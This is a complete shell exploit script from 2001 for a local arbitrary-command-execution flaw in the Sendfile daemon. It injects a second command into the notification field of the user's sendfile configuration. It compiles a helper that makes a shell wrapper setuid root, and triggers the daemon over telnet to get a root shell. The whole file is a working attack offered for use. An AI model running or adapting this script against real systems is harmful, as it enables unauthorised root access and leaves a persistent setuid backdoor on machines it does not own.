#!/bin/sh
#
# sfdnfy - Sendfile daemon local arbitrary command execution vulnerability
#
# references:
#   http://www.securityfocus.com/bid/2652
#   http://www.securityfocus.com/bid/2631
#
# 04/24/01 psheep

SFUSER=$USER
SFHOST=localhost
SFPORT=saft
SFSPOOL=/var/spool/sendfile
SFUSERCFG="$SFSPOOL/$SFUSER/config/config"

echo "Sendfile daemon local arbitrary command execution vulnerability"
echo
echo "  username        = $SFUSER"
echo "  spool directory = $SFSPOOL"
echo "  config file     = $SFUSERCFG"
echo "  target hostname = $SFHOST"
echo "  target port     = $SFPORT"
echo

if ! test -d $SFSPOOL; then
  echo "** unable to locate the sendfile spool directory, exiting"
  exit 1
fi

sfsavedcfg="no"

if ! test -d $SFSPOOL/$SFUSER || ! test -d $SFSPOOL/$SFUSER/config; then
  echo "** attempting to create sendfile spool directory for $SFUSER"
  echo
  (sleep 1;echo "TO $SFUSER";sleep 2) | telnet $SFHOST $SFPORT
  echo
else
  if test -f $SFUSERCFG; then
    echo "** backing up your sendfile daemon configuration file"
    mv $SFUSERCFG $SFSPOOL/$SFUSER/config/config.tmp
    sfsavedcfg="yes"
  fi
fi

cat > sfdnfy.c << EOF
#include <unistd.h>
#include <stdlib.h>

int main() {
    setreuid(0,0);
    setgid(0);
    system("chown root.root $PWD/sfdsh;chmod 4755 $PWD/sfdsh");
}
EOF

cat > sfdsh.c << EOF
#include <unistd.h>

int main() {
    setreuid(0,0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
}
EOF

echo "** compiling helper application as $PWD/sfdnfy"
cc -o $PWD/sfdnfy $PWD/sfdnfy.c

if ! test -x $PWD/sfdnfy; then
  echo "** compilation failed, exiting"
  exit 1
fi

echo "** compiling shell wrapper as $PWD/sfdsh"
cc -o $PWD/sfdsh $PWD/sfdsh.c

if ! test -x $PWD/sfdsh; then
  echo "** compilation failed, exiting"
  exit 1
fi

echo "** inserting commands into temporary configuration file"
echo "notification = mail $USER;$PWD/sfdnfy" >$SFUSERCFG

echo "** attempting attack against sendfile daemon..."
echo

(sleep 1;cat << EOF
FROM $USER
TO $USER
FILE boom$RANDOM
SIZE 0 0
DATA
FILE boom$RANDOM
SIZE 1 0
DATA
EOF
sleep 2) | telnet $SFHOST $SFPORT
echo

if test "x$sfsavedcfg" = xyes; then
  echo "** restoring backed up configuration file"
  mv $SFSPOOL/$SFUSER/config/config.tmp $SFUSERCFG
else
  echo "** removing temporary configuration file"
  rm $SFUSERCFG
fi

echo "** done, the shell wrapper should be suid root after the mailer is done"
echo
exit 1